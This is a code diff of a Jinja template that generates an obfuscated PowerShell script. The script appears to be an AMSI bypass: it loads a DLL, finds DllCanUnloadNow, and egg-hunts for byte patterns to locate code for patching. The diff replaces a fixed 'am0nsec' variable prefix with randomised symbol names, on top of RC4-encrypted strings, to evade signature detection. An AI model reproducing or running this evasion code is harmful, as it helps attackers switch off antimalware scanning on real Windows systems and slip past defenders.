@@ -9,15 +9,15 @@
 ] %}
 
 {% for s in strings %}
-    $am0nsecstring{{loop.index}} = {{symbol_name("Decrypt-String")}} "{{s|rc4encrypt}}"
+    ${{symbol_name("am0nsec")}}string{{loop.index}} = {{symbol_name("Decrypt-String")}} "{{s|rc4encrypt}}"
 {% endfor %}
 
-$am0nsecbytestring1 = {{symbol_name("Decrypt-String")}} {{"4C8BDC49895B0849896B104989731857415641574883EC70"|rc4byteencrypt}}
-$am0nsecbytestring2 = {{symbol_name("Decrypt-String")}} {{"8BFF558BEC83EC185356"|rc4byteencrypt}}
+${{symbol_name("am0nsec")}}bytestring1 = {{symbol_name("Decrypt-String")}} {{"4C8BDC49895B0849896B104989731857415641574883EC70"|rc4byteencrypt}}
+${{symbol_name("am0nsec")}}bytestring2 = {{symbol_name("Decrypt-String")}} {{"8BFF558BEC83EC185356"|rc4byteencrypt}}
 
 
 
-Add-Type $am0nsecstring1
+Add-Type ${{symbol_name("am0nsec")}}string1
 
 Class {{symbol_name("Hunter")}} {
     static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {
@@ -39,14 +39,14 @@ Class {{symbol_name("Hunter")}} {
     }
 }
 
-[IntPtr]$hModule = [Kernel32]::LoadLibrary($am0nsecstring2)
+[IntPtr]$hModule = [Kernel32]::LoadLibrary(${{symbol_name("am0nsec")}}string2)
 
-[IntPtr]${{symbol_name("dllCanUnloadNowAddress")}} = [Kernel32]::GetProcAddress($hModule, $am0nsecstring3)
+[IntPtr]${{symbol_name("dllCanUnloadNowAddress")}} = [Kernel32]::GetProcAddress($hModule, ${{symbol_name("am0nsec")}}string3)
 
 If ([IntPtr]::Size -eq 8) {
-    [byte[]]$egg = [System.Convert]::FromBase64String($am0nsecbytestring1)
+    [byte[]]$egg = [System.Convert]::FromBase64String(${{symbol_name("am0nsec")}}bytestring1)
 } Else {
-    [byte[]]$egg = [System.Convert]::FromBase64String($am0nsecbytestring2)
+    [byte[]]$egg = [System.Convert]::FromBase64String(${{symbol_name("am0nsec")}}bytestring2)
 }
 [IntPtr]${{symbol_name("targetedAddress")}} = [{{symbol_name("Hunter")}}]::FindAddress(${{symbol_name("dllCanUnloadNowAddress")}}, $egg)
 
